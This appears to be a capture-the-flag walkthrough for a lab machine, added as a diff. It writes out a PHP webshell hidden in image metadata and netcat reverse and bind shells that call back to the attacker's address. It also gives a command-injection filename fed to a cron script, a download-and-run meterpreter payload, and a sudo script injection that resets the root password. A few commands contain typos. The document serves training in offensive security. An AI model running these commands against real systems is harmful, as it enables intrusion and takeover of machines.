@@ -1,0 +1,157 @@
+1. Embed webshell into image.png
+exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' image.png
+
+2. Upload it via http://10.10.10.146/uploads.php page.
+
+3. Execute it:
+http://10.10.10.146/uploads/10_10_15_89.php.png?cmd=whoami
+
+4. Set up listener
+nc -nlvp 7777
+
+5 Execute nc reverse shell via webshell
+http://10.10.10.146/uploads/10_10_15_89.php.png?cmd=nc%20-e%20/bin/sh%2010.10.15.89%207777
+
+**********Priv Esc to user guly (EXPLANATION)**********
+
+The check_attack.php gets executed by crontab.guly as user guly, every 3 minutes. And it is vulnerable to command injection.
+Specifically this code:
+
+###########################
+require '/var/www/html/lib.php';
+$check = check_ip($name,$value);
+
+  if (!($check[0])) {
+    echo "attack!\n";
+    # todo: attach file
+    file_put_contents($logpath, $msg, FILE_APPEND | LOCK_EX);
+
+    exec("rm -f $logpath");
+    exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");
+<snip>
+###########################
+
+If the 0th element of the array returned by check is false, we will execute this line of code
+
+###########################
+exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");
+###########################
+
+Where
+$path = /var/www/html/uploads
+$value = the name of the file
+
+Since $check is the result of the check_ip function, we look at the check_ip function inside lib.php:
+
+###########################
+function check_ip($prefix,$filename) {
+  //echo "prefix: $prefix - fname: $filename<br>\n";
+  $ret = true;
+  if (!(filter_var($prefix, FILTER_VALIDATE_IP))) {
+    $ret = false;
+###########################
+
+Thus check_ip returns false if $prefix does not constitute a valid ip address (per FILTER_VALID_IP).
+Therefore, if we create a file inside /var/www/html/uploads that is not a valid ip the /bin/rm code will get executed. And we can inject our own command by terminating
+the /bin/rm command prematurely with a semicolon (;). For example, if we created a filename like:
+
+"; nc -c bash 10.10.15.89 8003"
+Then the resultant command would be:
+exec("nohup /bin/rm -f ; nc -c bash 10.10.15.89 8003 > /dev/null 2>&1 &");
+
+Thereby returning us a shell but as the user guly.
+
+**********Priv Esc to user guly (STEPS)**********
+
+1. Create a file in the /var/www/html/uploads directory
+sh-4.2$ touch '; nc -c bash 10.10.15.89 8003'
+
+2. Set up listener
+nv -nlvp 8003
+
+3. Wait 3 minutes and will get a shell as user guly
+
+The machine is buggy so set up bindhsells whenever possible to avoid having to repeat all steps to gain a shell.
+nc -nlvp 2586 -e /bin/bash & (apache)
+nc -nlvp 6894 -e /bin/bash & (guly)
+
+4. cat /home/user.txt
+526cfc2305f17faaacecf212c57d71c5
+
+
+**********Priv Esc to root (EXPLANATION)**********
+The changename.sh script can be run with sudo privileges as guly and is also vulnerable to escape/injection.
+The script prompts the user to enter values for an interface file. When entering these values, the first block
+of text will be accepted as the value and written to the file. Anything following that block of text, plus a <space>,
+will be executed as a command.
+
+For example, if a user entered AAAA whoami
+then the script would write AAAA to the file, and execute the command whoami.
+
+However, since there is regex, not everyhthing is so easily accepted like a reverse shell command. This will cause the script to
+error out. So we simplify our approach to a command that is not syntactically heavy but will also give us root: We will update the
+password of the root user using the usermod command.
+
+**********Priv Esc to root (STEPS)**********
+
+KALI:(unnecessary to get a meterpreter shell)
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.15.89 LPORT=8989 -b "\x00" -e x86/shikata_ga_nai -f elf -o ./met
+msfconsole
+use exploit/multi/handler
+set PAYLOAD linux/x86/meterpreter/reverse_tcp
+set LHOST 10.10.15.189
+set LPORT 8989
+python -m SimpleHTTPServer 8787
+
+TARGET:
+cd /tmp
+curl -o met http://10.10.15.89:8787/met
+chmoxd+x met
+./met
+
+1. Scanning for processes running at root we find an interesting looking script:
+ps aux | grep root
+root      45045  0.0  0.1 113180  1424 pts/8    S    01:45   0:00 /bin/bash -p /usr/local/sbin/changename.sh
+
+2. Investigating it we see that it can be executed by us as user guly with sudo permissions:
+ls -latr /usr/local/sbin
+-rwxr-xr-x   1 root root 422 Jul  8 12:34 changename.sh
+
+3. Navigate to the directory containing the script:
+cd /usr/local/sbin/
+
+KALI:
+4. Create a new password hash for Hello123 (usermod cmd requires password hash not plaintext)
+mkpasswd
+<enter Hello123>
+Password:
+0faKPYozbxBbQ
+
+TARGET;
+Execute the chagename.sh script
+5. sudo ./changename.sh
+
+-------------------------------------
+sh-4.2$ sudo ./changename.sh
+sudo ./changename.sh
+interface NAME:
+tttt usermod --password 0faKPYozbxBbQ root
+tttt usermod --password 0faKPYozbxBbQ root
+interface PROXY_METHOD:
+dsfdh
+dsfdh
+interface BROWSER_ONLY:
+<snip>
+-------------------------------------
+
+6. Enter values to satisfy the rest of the script 
+
+The script will execute the command and change the password for root to Hello123
+7. Switch to root:
+su root
+Enter password
+cat /root/root.txt
+0a8ecda83f1d81251099e8ac3d0dcb82
+
+
+
